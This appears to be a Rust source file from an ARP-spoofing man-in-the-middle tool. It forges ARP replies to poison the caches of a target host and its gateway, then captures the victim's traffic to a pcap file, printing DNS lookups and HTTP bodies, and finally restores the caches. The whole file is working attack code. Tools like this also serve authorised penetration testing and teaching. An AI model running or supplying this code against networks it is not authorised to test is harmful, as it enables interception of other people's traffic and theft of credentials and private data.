use std::net::{Ipv4Addr, IpAddr};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use pcap::Device;

use crate::{dns, http};
use crate::headers::{ArpHeader, ArpType, IpHeader, Ethernet};
use crate::util::{mac_to_string, pcap_open, self};

pub struct ArpSpoof
{
    device: Device,
    verbose: bool,
}

impl ArpSpoof
{
    pub fn new(interface_name: String, verbose: bool) -> ArpSpoof
    {
        //Create a device
        let all_devices = Device::list().expect("Unable to get device list");
        let d = all_devices.iter().find(|d| d.name == interface_name).expect("Unable to find device");

        ArpSpoof
        {
            device: d.clone(),
            verbose,
        }
    }

    pub fn get_own_ip(&self) -> Ipv4Addr
    {
        let my_ip = &self.device.addresses.iter().filter_map(|i| match i.addr {
            IpAddr::V4(ip) => Some(ip),
            _ => None
            }).last().expect("Unable to get ip address");

        *my_ip
    }
        
    pub fn arp_poisoning(&self,
        own_mac_addr: [u8; 6],
        own_ip_addr: Ipv4Addr,
        target_ip: Ipv4Addr,
        gateway_ip: Ipv4Addr,
        target_mac: &mut [u8; 6],    //target mac
        gateway_mac: &mut [u8; 6],    //gateway mac
        log_traffic: bool,
        running: &Arc<AtomicBool>) 
    {
        println!("[*] Resolving hosts (this can take a bit) ...");
        let capture = pcap_open(self.device.clone(), "arp").unwrap();
        let capture = Arc::new(Mutex::new(capture));
        
        let mac_a = match util::read_arp_cache(&target_ip.to_string()) 
        {
            Some(mac) => mac,
            None => self.resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, target_ip).unwrap(),
        };

        let mac_b = match util::read_arp_cache(&gateway_ip.to_string()) 
        {
            Some(mac) => mac,
            None => self.resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, gateway_ip).unwrap(),
        };

        target_mac.copy_from_slice(&mac_a);
        gateway_mac.copy_from_slice(&mac_b);

        println!("[*] Target MAC: {}", mac_to_string(&target_mac));
        println!("[*] Gateway MAC: {}", mac_to_string(&gateway_mac));

        // Enable traffic logging
        if log_traffic 
        {
            const CAP_FILE_NAME: &str = "rozmitmat.pcap";

            let log_cap_filter = format!("host {}", target_ip);
            let log_file = PathBuf::from(CAP_FILE_NAME);

            println!("[*] Saving captured packets as {} ...", log_file.display());
            
            let mut log_cap = pcap_open(self.device.clone(), &log_cap_filter).unwrap();
            
            let r = running.clone();
            let v = self.verbose;

            thread::spawn(move || {
                log_traffic_pcap(&mut log_cap, &log_file, &r, v).expect("Unable to write packets to file")
            });
        }

        println!("[+] Poisoning traffic between {} <==> {}",target_ip, gateway_ip);
        println!("[*] Press Ctrl-C to stop");

        // packets used for poisoning
        let packets: Vec<ArpHeader> = vec![
            ArpHeader::new(
                ArpType::ArpReply,
                own_mac_addr,
                target_ip,
                mac_b,
                gateway_ip,
            ),
            ArpHeader::new(
                ArpType::ArpReply,
                own_mac_addr,
                gateway_ip,
                mac_a,
                target_ip,
            ),
        ];

        let mut cap = capture.lock().unwrap();
        
        loop 
        {
            for p in &packets 
            {
                if let Err(e) = cap.sendpacket(p.to_raw().as_ref()) 
                {
                    println!("Unable to send packet: {}", e)
                }
            }
            
            if !running.load(Ordering::SeqCst) 
            {
                break;
            }
            
            const SLEEP_TIME: u64 = 1500;
            
            thread::sleep(Duration::from_millis(SLEEP_TIME));
        }
    }

    pub fn run_arp_cleanup(&self, target_mac: [u8; 6], target_ip: Ipv4Addr, gateway_mac: [u8;6], gateway_ip: Ipv4Addr) 
    {
        println!("[+] Cleaning up ARP cache ...");

        let mut cap = pcap_open(self.device.clone(), "arp").unwrap();

        let packet = ArpHeader::new(
            ArpType::ArpRequest, gateway_mac, gateway_ip, target_mac, target_ip);

        if let Err(e) = cap.sendpacket(packet.to_raw().as_ref()) 
        {
            println!("[!] Unable to send packet: {}", e);
            return;
        }

        let packet = ArpHeader::new(
            ArpType::ArpRequest, target_mac, target_ip, gateway_mac, gateway_ip);

        if let Err(e) = cap.sendpacket(packet.to_raw().as_ref()) 
        {
            println!("[!] Unable to send packet: {}", e);
            return;
        }
    }

    /// This function sends an ArpRequest to resolve the mac address for the given ip
    pub fn resolve_mac_addr(&self,
        capture: Arc<Mutex<pcap::Capture<pcap::Active>>>,
        own_mac_addr: [u8; 6],
        own_ip_addr: Ipv4Addr,
        ip_addr: Ipv4Addr) -> Option<[u8; 6]> 
    {
        let scoped_capture = capture.clone();
        // Spawn new thread to capture ArpReply

        let join_handle = thread::spawn(move || {
            let max_fails = 4;
            let mut fail_counter = 0;

            loop 
            {
                if fail_counter >= max_fails 
                {
                    println!("[!] -> {} seems to be offline", ip_addr);
                    return None;
                }

                let mut cap = scoped_capture.lock().unwrap();
                
                match cap.next_packet() 
                {
                    Ok(packet) => {
                        let arp_header = ArpHeader::from_raw(packet.data).unwrap();
                        let dest_ip = Ipv4Addr::new(
                            arp_header.source_ip[0],
                            arp_header.source_ip[1],
                            arp_header.source_ip[2],
                            arp_header.source_ip[3],
                        );

                        if arp_header.op_code == u16::to_be(0x2) && ip_addr == dest_ip 
                        {
                            println!("[*] -> found {} at {}", mac_to_string(&arp_header.source_mac),ip_addr);
                            return Some(arp_header.source_mac);
                        }
                    }
                    Err(_) => fail_counter += 1,
                }
            }
        });

        let crafted = ArpHeader::new(
            ArpType::ArpRequest,
            own_mac_addr,
            own_ip_addr,
            [0xff, 0xff, 0xff, 0xff, 0xff, 0xff],
            ip_addr,
        );

        // Send some ArpRequests
        for _ in 0..10 
        {
            let mut cap = capture.lock().unwrap();
            
            if let Err(e) = cap.sendpacket(crafted.to_raw()) 
            {
                panic!("[!] Unable to send packet: {}", e);
            }

            thread::sleep(Duration::from_millis(25));
        }

        join_handle.join().unwrap()
    }
}

fn print_dns_info(packet: &pcap::Packet) 
{
    let (answers, questions) = dns::decode_dns(&packet.data);

    if questions.is_some()
    {
        questions.iter().for_each(|q| {
            for i in q
            {
                println!("[*] Question: name: {}", i.name);
            }
        });
    }
    if answers.is_some()
    {
        answers.iter().for_each(|a| {
            for i in a
            {
                println!("[*] Answer: name: {}, ip: {}, ttl: {}", i.name, i.ip, i.ttl);
            }
        });
    }
}

fn print_src_dst_address(packet: &pcap::Packet) 
{
    //find source and destination ip addresses
    let ip_header = IpHeader::from_raw(&packet.data[14..34]);
    let src_ip = ip_header.source_ip;
    let dst_ip = ip_header.dest_ip;

    //find source and destination mac addresses
    let eth_header = Ethernet::from_raw(&packet.data[0..14]).unwrap();
    let src_mac = mac_to_string(&eth_header.source_mac);
    let dst_mac = mac_to_string(&eth_header.dest_mac);

    println!("[*] Source IP {} -> Destination IP {} ({} -> {})", src_ip, dst_ip, src_mac, dst_mac);
}

/// Logs traffic to the given pcap file and prints a short network statistic
pub fn log_traffic_pcap(cap: &mut pcap::Capture<pcap::Active>, log_file: &Path, running: &Arc<AtomicBool>, verbose: bool) -> Result<(), pcap::Error> 
{
    let mut savefile = cap.savefile(log_file)?;
    let mut last_print = Instant::now();
    let print_threshold = Duration::from_secs(15);

    loop 
    {
        let packet = cap.next_packet()?;

        savefile.write(&packet);
        savefile.flush()?;

        print_dns_info(&packet);

        if let Some(c) = http::get_http_body(&packet.data)
        {
            if c.len() > 0
            {
                println!("[*] HTTP Body: {}", c);
            }
        }

        if verbose 
        {
            print_src_dst_address(&packet);
        }

        if last_print.elapsed() > print_threshold 
        {
            let stats = cap.stats()?;

            println!("\r[*] Received: {}, dropped: {}, if_dropped: {}", stats.received, stats.dropped, stats.if_dropped);

            last_print = Instant::now()
        }

        if !running.load(Ordering::SeqCst) 
        {
            break;
        }
    }

    Ok(())

}